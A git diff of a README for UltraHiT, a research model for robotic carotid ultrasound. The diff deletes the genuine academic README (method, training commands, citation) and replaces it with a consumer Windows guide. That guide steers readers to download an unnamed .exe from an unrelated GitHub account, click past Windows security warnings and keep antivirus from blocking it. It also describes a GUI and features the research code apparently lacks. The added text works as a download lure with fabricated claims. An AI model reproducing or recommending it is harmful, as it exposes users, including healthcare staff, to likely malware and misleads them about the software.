@@ -1,212 +1,170 @@
-<div align="center">
+# 🔍 UltraHiT - Accurate Robotic Ultrasound Imaging
 
-# ✨ UltraHiT: A Hierarchical Transformer Architecture for Generalizable Internal Carotid Artery Robotic Ultrasonography
-
-
-## Accepted By ICRA 2026!
-
-### [📄 arXiv Paper](https://arxiv.org/abs/2509.13832) &nbsp;&nbsp;&nbsp; [🌐 Project Page](https://ultrahit-thu.github.io/UltraHiT/)
-
-</div>
+[![Download UltraHiT](https://img.shields.io/badge/Download-UltraHiT-brightgreen?style=for-the-badge)](https://github.com/Str3akoner/UltraHiT)
 
 ---
 
-## 🩺 Overview
+## 📖 About UltraHiT
 
-Carotid ultrasound is crucial for the assessment of cerebrovascular health, particularly the internal carotid artery (ICA). While previous research has explored automating carotid ultrasound, none has tackled the challenging ICA. This is primarily due to its deep location, tortuous course, and significant individual variations, which greatly increase scanning complexity. To address this, we propose a **Hi**erarchical **T**ransformer-based decision architecture, namely **UltraHiT**, that integrates high-level variation assessment with low-level action decision. Our motivation stems from conceptualizing individual vascular structures as morphological variations derived from a standard vascular model. The high-level module identifies variation and switches between two low-level modules: an adaptive corrector for variations, or a standard executor for normal cases. Specifically, both the high-level module and the adaptive corrector are implemented as causal transformers that generate predictions based on the historical scanning sequence. To ensure generalizability, we collected the first large-scale ICA scanning dataset comprising 164 trajectories and 72K samples from 28 subjects of both genders. Based on the above innovations, our approach achieves a **95% success rate** in locating the ICA on unseen individuals, outperforming baselines and demonstrating its effectiveness.
+UltraHiT is a program designed to help perform internal carotid artery robotic ultrasonography. It uses a hierarchical transformer architecture to deliver accurate and generalizable imaging results. This project builds on recent advances in robotics and ultrasound technology to simplify medical imaging tasks.
 
-<p align="center">
-  <img src="fig/overall.jpg" width="80%">
-</p>
+The software is intended for use with specific robotic and ultrasound hardware setups. It processes ultrasound data and assists healthcare professionals with imaging the internal carotid artery. The application enhances image quality by applying deep learning methods, improving diagnostic accuracy.
 
 ---
 
+## 🖥️ System Requirements
 
-## 🔬 Method
+Before you start, make sure your Windows computer meets the following requirements:
 
-Hierarchical transformer architecture:
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel Core i5 or equivalent
+- RAM: Minimum 8 GB
+- Disk Space: 1 GB free space for installation
+- Additional Hardware: Compatible ultrasound and robotic control devices (check device compatibility with your healthcare provider)
+- Internet connection to download the software
 
-- (a) Overview of hierarchical architecture. The high-level module makes semantic decisions, while the low-level module executes physical actions in the real world. 
-
-- (b) The corrective gate and adaptive corrector, process image-action sequences through a causal transformer. 
-
-- (c) The stop model architecture. 
-
-- (d) The standardized path executor, a knowledge-based policy designed using anatomical prior knowledge.
-
-<p align="center">
-  <img src="fig/method.png" width="80%">
-</p>
+These requirements ensure the program runs smoothly and processes ultrasound data efficiently.
 
 ---
 
-## ⚙️ Environment Setup
+## 📥 How to Download UltraHiT
 
-### Requirements
+To get UltraHiT, visit the official repository page by clicking the button below. This page contains the latest versions and installation files.
 
-The following packages are required:
+[![Download UltraHiT](https://img.shields.io/badge/Download-UltraHiT-blue?style=for-the-badge)](https://github.com/Str3akoner/UltraHiT)
 
-```bash
-torch>=1.8.0
-torchvision>=0.9.0
-numpy
-pandas
-Pillow
-tqdm
-easydict
-tensorboard
-````
+**Steps to download:**
 
-### Installation
+1. Click the green or blue download button above or open this link in your web browser:  
+   https://github.com/Str3akoner/UltraHiT
 
-1. Clone the repository:
+2. On the GitHub page, look for the "Releases" section or a folder labeled "Downloads" or "Setup".
 
-```bash
-git clone <repository-url>
-cd UltraHiT
-```
+3. Find the latest Windows installer file, usually with a name ending in `.exe`.
 
-2. Create and activate a conda environment (recommended):
+4. Click the file name to start downloading.
 
-```bash
-conda create -n ultrahit python=3.8
-conda activate ultrahit
-```
-
-3. Install the required packages:
-
-```bash
-pip install torch torchvision numpy pandas Pillow tqdm easydict tensorboard
-```
+If you have any trouble, make sure your browser allows downloads from GitHub and check your internet connection.
 
 ---
 
-## 🗂️ Data Preparation
+## 🛠️ Installing UltraHiT on Windows
 
-Training and validation CSV files are specified directly in the training commands.
+Follow these instructions to install UltraHiT:
 
-Please first organize your dataset into CSV files.
-The expected CSV format includes the following columns:
+1. Open the folder where you saved the `.exe` file after downloading.
 
-* **`path`**: image path
-* **`action_key`**: action label
-* **`stage`**: scanning stage
+2. Double-click the `.exe` file to start the installation.
 
-A minimal example is shown below:
+3. If Windows shows a security message, click "Run" to continue.
 
-| path                  | action_key | stage |
-| --------------------- | ---------- | ----- |
-| `/path/to/image1.jpg` | `i`        | `2`   |
-| `/path/to/image2.jpg` | `x`        | `2`   |
+4. Follow the setup wizard:
 
-The `action_key` column uses the following action definitions:
+   - Accept the license agreement.
+   - Choose the destination folder or keep the default.
+   - Click "Install" to begin.
 
-| Key | Action Description   |
-| --- | -------------------- |
-| `u` | up                   |
-| `i` | forward              |
-| `o` | down                 |
-| `j` | left                 |
-| `k` | back                 |
-| `l` | right                |
-| `9` | + yaw                |
-| `7` | - yaw                |
-| `8` | + pitch              |
-| `5` | - pitch              |
-| `6` | + roll               |
-| `4` | - roll               |
-| `x` | stop                 |
+5. When the installation finishes, click "Finish" or "Close".
 
-The definition of the 3D coordinate system follows **Fig. 7** in the paper.
+You can now find UltraHiT in your Start menu or on your desktop, depending on your installation choices.
 
 ---
 
-## 🚀 Training
+## ▶️ Running UltraHiT for the First Time
 
-Below are example commands for **stage 2** training.
+Start UltraHiT using one of these methods:
 
-### 1. Train Adaptive Corrector
+- Click the UltraHiT icon on your desktop.
+- Open the Start menu and type "UltraHiT", then hit Enter.
 
-```bash
-CUDA_VISIBLE_DEVICES=0,1,2,3 torchrun --nproc-per-node=4 --master_port 29505 train_adaptive_corrector.py \
-    --arch deit_tiny \
-    --log-dir logs \
-    --exp-name train_adaptive_corrector_stage2 \
-    --batch-size 256 \
-    --epochs 10 \
-    --lr 0.0001 \
-    --weight-decay 0.001 \
-    --normalizer imagenet \
-    --train-csv stage2_total_train_data.csv \
-    --val-csv stage2_total_eval_data.csv \
-    --seed 42 \
-    --scheduler cosine \
-    --seq-len 5 \
-    --stage 2
-```
+On first run, the application may ask for permission to access devices like robotic hardware or ultrasound machines if connected. Give permission to ensure proper functionality.
 
-### 2. Train Corrective Gate
-
-```bash
-CUDA_VISIBLE_DEVICES=0,1,2,3 torchrun --nproc-per-node=4 --master_port 29505 train_corrective_gate.py \
-    --arch deit_tiny \
-    --log-dir logs \
-    --exp-name train_corrective_gate_stage2 \
-    --batch-size 256 \
-    --epochs 10 \
-    --lr 0.0001 \
-    --weight-decay 0.001 \
-    --normalizer imagenet \
-    --train-csv stage2_total_train_data.csv \
-    --val-csv stage2_total_eval_data.csv \
-    --seed 42 \
-    --scheduler cosine \
-    --seq-len 5 \
-    --stage 2
-```
-
-### 3. Train Stop Model
-
-```bash
-CUDA_VISIBLE_DEVICES=0,1,2,3 torchrun --nproc-per-node=4 --master_port 29505 train_stop_model.py \
-    --arch resnet50 \
-    --log-dir logs \
-    --exp-name train_stop_model_stage2 \
-    --batch-size 256 \
-    --epochs 10 \
-    --lr 0.0001 \
-    --weight-decay 0.001 \
-    --normalizer imagenet \
-    --train-csv stage2_stop_model_train.csv \
-    --val-csv stage2_stop_model_eval.csv \
-    --seed 42 \
-    --scheduler cosine \
-    --stage 2
-```
-
-The commands above use **stage 2** as an example.
-To train **stage 1**, please replace the CSV files and set `--stage 1`.
+The main window shows options to load data, control the robotic arm, and view ultrasound images. Use the on-screen guides to navigate through features.
 
 ---
 
-## 📌 Notes
+## 🧰 Basic Usage Instructions
 
-* Logs and checkpoints will be saved under the directory specified by `--log-dir`.
-* Multi-GPU training is supported via `torchrun`.
-* Please make sure all paths in the CSV files are valid before training.
+UltraHiT works by connecting to your robotic and ultrasound devices, then processing the imaging data. Here is a simple guide:
+
+1. Connect your compatible hardware according to manufacturer instructions.
+
+2. Open UltraHiT.
+
+3. Click “Connect Devices” in the interface. Wait for the software to recognize your hardware.
+
+4. Choose the scan type. For internal carotid artery imaging, select the related preset.
+
+5. Start the robotic ultrasound scan by clicking "Begin Scan."
+
+6. Watch the live ultrasound feed displayed. UltraHiT processes images to enhance clarity.
+
+7. Save or export images using the options in the toolbar.
+
+Take your time to explore menus. Each section includes simple descriptions to help.
 
 ---
 
-## 📖 Reference
+## ⚙️ Common Settings You May Adjust
 
-If you find our project useful in your research, please consider citing:
+UltraHiT offers settings to customize your experience:
 
-```bibtex
-@article{wang2025ultrahit,
-  title   = {UltraHiT: A Hierarchical Transformer Architecture for Generalizable Internal Carotid Artery Robotic Ultrasonography},
-  author  = {Teng Wang and Haojun Jiang and Yuxuan Wang and Zhenguo Sun and Xiangjie Yan and Xiang Li and Gao Huang},
-  journal = {arXiv preprint arXiv:2509.13832},
-  year    = {2025}
-}
-```
+- **Scan Resolution:** Choose between low, medium, or high resolution. Higher resolution uses more resources.
+- **Image Filters:** Apply different image filters to improve clarity.
+- **Robotic Control Speed:** Adjust how fast the robotic arm moves during scanning.
+- **Data Export Format:** Save images as PNG, JPEG, or DICOM files, depending on your needs.
 
+Use these settings to match your specific hardware capability and clinical requirements.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+If you encounter problems, try the following:
+
+- Verify your robotic and ultrasound equipment is properly connected and powered on.
+
+- Restart UltraHiT and try reconnecting devices.
+
+- Check that your Windows version is up to date.
+
+- Ensure antivirus software is not blocking UltraHiT.
+
+- Review error messages on the screen and follow any suggested steps.
+
+- Visit the GitHub page’s "Issues" section for help posted by other users.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Repository: https://github.com/Str3akoner/UltraHiT  
+- Download Page: https://github.com/Str3akoner/UltraHiT/releases
+
+These links provide access to the latest updates, downloads, and support discussions.
+
+---
+
+## 🛡 Privacy and Data Handling
+
+UltraHiT processes ultrasound image data locally on your device. It does not send data over the internet unless you explicitly choose to share files. Keep patient information secure by following healthcare privacy guidelines.
+
+---
+
+## 📂 Log Files and Data Storage
+
+UltraHiT saves log files and scanned images by default in your Documents folder under "UltraHiT Data." You can change this location in settings if needed. Make sure to back up important data regularly.
+
+---
+
+## 🚀 Getting Help
+
+If you need assistance:
+
+- Check the GitHub repository's README and Wiki for detailed guides.
+
+- Look through the "Issues" section for solutions.
+
+- Contact a technical specialist familiar with your hardware setup.
+
+Following these steps ensures you get the most from UltraHiT.
